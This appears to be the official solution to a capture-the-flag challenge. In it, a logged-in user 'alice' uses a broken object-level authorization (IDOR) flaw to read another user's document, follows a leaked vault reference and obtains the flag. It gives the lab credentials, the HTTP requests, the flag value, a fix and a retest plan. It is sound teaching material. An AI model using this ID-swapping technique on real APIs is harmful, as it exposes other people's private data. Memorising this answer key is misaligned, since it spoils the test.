# DuckVault — Official Solution

## 1. Executive Summary
DuckVault is a self-contained REST API security challenge demonstrating a Broken Object Level Authorization (BOLA) / IDOR vulnerability.
The application correctly authenticates users using JWT bearer tokens, but the document retrieval endpoint fails to verify that the requested document belongs to the authenticated user.
The intended exploitation path allows an authenticated Alice user to retrieve another user's document, discover a protected vault reference, and use that reference to reach the flag.

### Primary Vulnerability
BOLA / IDOR

### Security Impact
An authenticated low-privileged user can access documents belonging to other users and obtain sensitive information that should be restricted by object ownership.

### Learning Objective
Understand how authentication alone does not provide object-level authorization and how APIs must verify ownership or access permissions for every requested object.

---

## 2. Challenge Overview
DuckVault provides an API for authenticated users to manage and retrieve internal documents.
The challenge contains three users:

| ID | Username | Role  |
| -: | -------- | ----- |
|  1 | alice    | user  |
|  2 | bob      | user  |
|  3 | admin    | admin |

Alice is the intended attacker account.
Alice can normally retrieve her own documents:

```text
1001 - Project Proposal
1002 - Expense Report
```

Other documents belong to Bob or the administrator.

The vulnerable endpoint is:

```http
GET /api/documents/<document_id>
```

The endpoint checks whether the requester is authenticated but does not verify document ownership.

Difficulty:

```text
Easy
```

Estimated solve time:

```text
10–20 minutes
```

---

## 3. Architecture & Trust Boundaries
The application consists of:

```text
Player
  |
  | HTTP
  v
Flask / Gunicorn REST API
  |
  +---- JWT Authentication
  |
  +---- SQLite Database
          |
          +---- users
          +---- documents
          +---- vault_resources
```

The intended authorization boundary is between an authenticated user and objects owned by other users.
The vulnerable flow is:

```text
Authenticated Alice
        |
        v
GET /api/documents/<id>
        |
        v
Document lookup
        |
        X  Missing ownership check
        |
        v
Bob's document
        |
        v
Vault reference
        |
        v
Vault resource
        |
        v
Flag
```

The JWT implementation itself is not the intended vulnerability.

---

## 4. Attacker Starting Point
The attacker starts with valid credentials for the Alice account.

```text
Username: alice
Password: AliceVault2026!
Role: user
```

The attacker does not have Bob's credentials and does not have administrator privileges.
The application is available at:

```text
http://localhost:8000
```

---

## 5. Attack Surface
Relevant endpoints:

```http
POST /api/login
GET  /api/me
GET  /api/documents
GET  /api/documents/<document_id>
GET  /api/vault/<reference>
```

The most important endpoint is:

```http
GET /api/documents/<document_id>
```

The document identifier is a direct object reference.

---

## 6. Vulnerability Description
### Vulnerability Type
Broken Object Level Authorization (BOLA), also known as IDOR.

### Affected Component

```text
GET /api/documents/<document_id>
```

### Preconditions
The attacker must have a valid authenticated account.

### Failed Security Control
The application verifies authentication but does not verify authorization for the requested document.
The vulnerable query is effectively:

```sql
SELECT
    id,
    owner_id,
    title,
    content,
    vault_reference
FROM documents
WHERE id = ?
```

The query identifies the requested object but does not restrict it to the authenticated user's ownership.
The secure logic should additionally enforce:

```text
document.owner_id == authenticated_user.id
```

---

## 7. Intended Attack Path
### Step 1 — Authenticate
Authenticate as Alice:

```http
POST /api/login
Content-Type: application/json

{
  "username": "alice",
  "password": "AliceVault2026!"
}
```

The server returns a JWT bearer token.

---

### Step 2 — Confirm the authenticated identity

```http
GET /api/me
Authorization: Bearer <ALICE_TOKEN>
```

Expected result:

```json
{
  "id": 1,
  "role": "user",
  "username": "alice"
}
```

---

### Step 3 — Enumerate the attacker's documents

```http
GET /api/documents
Authorization: Bearer <ALICE_TOKEN>
```

Expected result:

```json
{
  "documents": [
    {
      "id": 1001,
      "owner_id": 1,
      "title": "Project Proposal"
    },
    {
      "id": 1002,
      "owner_id": 1,
      "title": "Expense Report"
    }
  ]
}
```

This establishes Alice's normal document access.

---

### Step 4 — Test another document identifier

Request:

```http
GET /api/documents/2001
Authorization: Bearer <ALICE_TOKEN>
```

The expected vulnerable response is:

```json
{
  "id": 2001,
  "owner_id": 2,
  "title": "Security Assessment",
  "content": "Internal security assessment. Reference: vault-bob-7f3a",
  "vault_reference": "vault-bob-7f3a"
}
```

The important observation is that:

```text
owner_id = 2
```

while the authenticated user is:

```text
id = 1
```

The server nevertheless returns the document. This demonstrates the BOLA/IDOR vulnerability.

---

### Step 5 — Follow the exposed object reference
The unauthorized document exposes:

```text
vault-bob-7f3a
```

Request:

```http
GET /api/vault/vault-bob-7f3a
Authorization: Bearer <ALICE_TOKEN>
```

The challenge returns the vault resource and flag.

---

### Step 6 — Retrieve the Flag
Successful exploitation results in a response containing:

```json
{
  "description": "Bob's restricted security vault resource.",
  "flag": "duck{BOLA_done_right}",
  "reference": "vault-bob-7f3a"
}
```

The flag is intentionally omitted from player-facing documentation and source/configuration.

---

## 8. Impact Assessment
### Confidentiality
High within the challenge context.
Alice can retrieve documents belonging to another user, including their contents and associated sensitive references.

### Integrity
Not demonstrated.
The vulnerable endpoint is read-only and does not allow modification of another user's document.

### Availability
Not demonstrated.
No denial-of-service condition is part of the intended challenge.

### Privileges
The attacker remains a normal user.
The vulnerability provides unauthorized access to objects rather than administrative privileges.

---

## 9. Flag Retrieval
The flag is only intended to be reached after crossing the document object-level authorization boundary.

Required condition:

```text
Authenticated Alice
        ↓
Unauthorized document retrieval
        ↓
Vault reference disclosure
        ↓
Vault resource access
        ↓
Flag
```

The intended BOLA vulnerability is therefore directly responsible for reaching the flag.
The flag is not intended to be discoverable through source code, static files, configuration, or unrelated endpoints.

---

## 10. Root Cause
The root cause is missing object-level authorization.
Authentication establishes that the requester is Alice, but the document endpoint does not establish that Alice is authorized to access the requested document.
The vulnerable implementation retrieves a document solely by its identifier:

```sql
WHERE id = ?
```

without checking:

```text
owner_id == authenticated_user.id
```

The security boundary is therefore enforced for authentication but not for object authorization.

---

## 11. Remediation
The document retrieval endpoint must verify ownership or another explicit authorization rule before returning the object.
A secure implementation should query the document using both the object identifier and the authenticated user's identity:

```sql
SELECT
    id,
    owner_id,
    title,
    content,
    vault_reference
FROM documents
WHERE id = ?
  AND owner_id = ?
```

The application should return an appropriate authorization response when the document exists but does not belong to the requester.
Authorization must be enforced server-side and must not rely on client-side filtering or hidden identifiers.

---

## 12. Verification & Retest
### Vulnerable Behavior
Before remediation:

```text
Alice (user id 1)
        |
        v
GET /api/documents/2001
        |
        v
Bob's document returned
```

Expected vulnerable status:

```text
200 OK
```

### Expected Secure Behavior

After remediation:

```text
Alice (user id 1)
        |
        v
GET /api/documents/2001
        |
        v
Authorization check
        |
        v
Access denied
```

Expected status:

```text
403 Forbidden
```

or another documented authorization-denial response.

### Retest Procedure
1. Authenticate as Alice.
2. Confirm Alice's identity using `/api/me`.
3. Retrieve Alice's document list.
4. Request Bob's document identifier.
5. Verify that Bob's document is no longer returned.
6. Verify that Alice can still retrieve her own documents.
7. Verify that the intended challenge build continues to expose the vulnerable behavior before remediation.
8. Verify the flag is reachable through the intended vulnerable build.
9. Reset the challenge.
10. Repeat the intended attack path from the clean state.

### Regression Tests
The validation suite should verify:

```text
Unauthenticated request      -> rejected
Alice own document           -> allowed
Alice Bob's document         -> vulnerable build: allowed
Alice Bob's document         -> remediated build: denied
Existing document            -> correct response
Non-existent document        -> 404
```

---

## 13. Unintended Attack Paths
During validation, the following potential shortcuts should be checked:
* Direct access to vault references without first obtaining them through the document endpoint.
* Exposure of the flag in source code.
* Exposure of the flag in configuration files.
* Exposure of the flag through static files.
* Exposure of the flag through container metadata.
* Exposure of the flag through error messages.
* Authentication or JWT bypasses.
* Alternative endpoints that directly return the flag.

The intended challenge path is:

```text
Alice authentication
        ↓
Document enumeration
        ↓
BOLA/IDOR
        ↓
Unauthorized Bob document
        ↓
Vault reference
        ↓
Vault resource
        ↓
Flag
```

Any unintended shortcut discovered during final validation must be removed or explicitly documented before submission.

---

## 14. Conclusion
DuckVault demonstrates the difference between authentication and authorization in REST APIs.
The attacker begins with a valid low-privileged account and exploits a missing object-level authorization check to retrieve another user's document.
The unauthorized document exposes the vault reference required to continue the intended attack chain and retrieve the challenge flag.
The challenge is designed to teach that every object requested through an API must be authorized against the identity and privileges of the requester.